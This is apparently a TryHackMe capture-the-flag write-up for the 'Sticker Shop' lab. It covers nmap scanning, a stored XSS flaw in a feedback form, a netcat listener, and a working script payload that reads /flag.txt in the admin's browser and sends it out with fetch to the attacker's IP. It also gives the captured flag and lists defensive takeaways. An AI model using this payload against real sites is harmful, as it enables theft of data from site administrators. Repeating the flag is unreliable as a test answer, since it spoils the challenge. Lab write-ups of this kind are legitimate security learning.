# The Sticker Shop - TryHackMe Writeup

## Challenge Name
**The Sticker Shop**

## Objective
Read the contents of:

```text
http://10.48.134.7:8080/flag.txt
```

---

# Enumeration

Started with an Nmap scan:

```bash
nmap -sC -sV -A 10.48.134.7
```

## Results

```text
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
8080/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.8.10)
```

The web application was running on port `8080`.

---

# Web Application Analysis

Opening the website:

```text
http://10.48.134.7:8080
```

Showed a simple **Cat Sticker Shop** webpage.

Important observation:

```html
<li><a href="/submit_feedback">Feedback</a></li>
```

The challenge description also mentioned:

> They decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback.

This strongly suggests:

- The administrator reviews submitted feedback manually
- The admin browser can access internal resources
- A stored XSS vulnerability may exist

---

# Vulnerability Identification

The application likely stores user feedback and displays it later to the admin without sanitization.

This means we can inject JavaScript that executes in the admin's browser.

Goal:

1. Inject JavaScript payload
2. Admin loads feedback page
3. Payload executes in admin browser
4. Read `/flag.txt`
5. Exfiltrate flag to attacker machine

---

# Exploitation

## Step 1: Start Listener

On attacker machine:

```bash
nc -lvnp 9001
```

---

## Step 2: Create XSS Payload

Payload used:

```html
<script>
fetch('/flag.txt')
  .then(r => r.text())
  .then(d => {
    fetch('http://YOUR-IP:9001/?c=' + encodeURIComponent(d))
  })
</script>
```

Replace `YOUR-IP` with your VPN/Tun0 IP.

Example:

```html
<script>
fetch('/flag.txt')
.then(r=>r.text())
.then(d=>{
fetch('http://192.168.248.179:9001/?c='+encodeURIComponent(d))
})
</script>
```

---

## Step 3: Submit Payload

Go to:

```text
http://10.48.134.7:8080/submit_feedback
```

Paste the payload into the feedback form and submit it.

---

# Receiving the Flag

Listener output:

```text
connect to [192.168.248.179] from (UNKNOWN) [10.48.134.7]

GET /?c=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1
```

Decoded flag:

```text
THM{83789a69074f636f64a38879cfcabe8b62305ee6}
```

---

# Final Flag

```text
THM{83789a69074f636f64a38879cfcabe8b62305ee6}
```

---

# Vulnerability Summary

## Vulnerability Type
Stored Cross-Site Scripting (Stored XSS)

## Root Cause
User input was rendered without sanitization or escaping.

## Impact
An attacker could execute arbitrary JavaScript in the administrator's browser and access internal resources.

---

# Key Takeaways

- Never trust user input
- Always sanitize and escape feedback/comments
- Internal resources should not rely solely on localhost protection
- Separate admin systems from public-facing services

---

# Tools Used

- Nmap
- Netcat
- Browser Developer Tools
- JavaScript Fetch API

---

# Attack Flow Diagram

```text
Attacker
   |
   | submits XSS payload
   v
Web Application
   |
   | admin reviews feedback
   v
Admin Browser executes JS
   |
   | fetch('/flag.txt')
   v
Reads internal flag
   |
   | sends flag to attacker listener
   v
Attacker receives flag
```

---
